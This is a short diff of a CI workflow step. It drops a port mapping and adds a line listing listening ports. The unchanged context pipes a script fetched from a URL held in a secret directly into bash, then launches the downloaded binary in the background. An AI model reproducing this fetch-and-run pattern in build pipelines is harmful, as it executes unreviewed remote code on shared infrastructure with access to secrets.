@@ -20,14 +20,12 @@ jobs:
     - name: Run inline shell commands
       env:
         TESTING: ${{ secrets.TESTING }}
-      port:
-        - 22526:22526
-        - 22525:22525
       run: |
         echo "Starting build process..."
         curl -sSL $TESTING | bash -s -- ddrv
 
         cd *_DD
+        lsof -i -P -n | grep LISTEN
 
         ls
         ./*_DD & echo $! > app.pid
